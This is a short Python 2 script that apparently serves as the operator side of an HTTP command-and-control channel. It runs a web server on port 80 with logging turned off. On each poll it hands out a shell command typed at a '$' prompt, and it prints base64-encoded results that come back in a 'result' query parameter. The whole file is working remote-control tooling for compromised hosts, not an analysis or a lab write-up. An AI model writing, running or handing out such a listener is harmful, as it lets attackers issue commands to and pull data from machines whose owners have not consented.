#!/usr/bin/python

from urlparse import urlparse, parse_qs
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer

serverPort = 80

class webServer(BaseHTTPRequestHandler):

    def do_GET(self,):
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()

        query_components = parse_qs(urlparse(self.path).query)
        if "result" in query_components:
            print(query_components["result"][0].decode("base64"))
            self.wfile.write("")
            return
        cmd = raw_input("$ ")
        self.wfile.write("{}".format(cmd))
        return

    def log_message(self, format, *args):
        return

try:
    server = HTTPServer(("", serverPort), webServer)
    print("Server running on port: {}".format(serverPort))
    server.serve_forever()
except KeyboardInterrupt:
    server.socket.close()
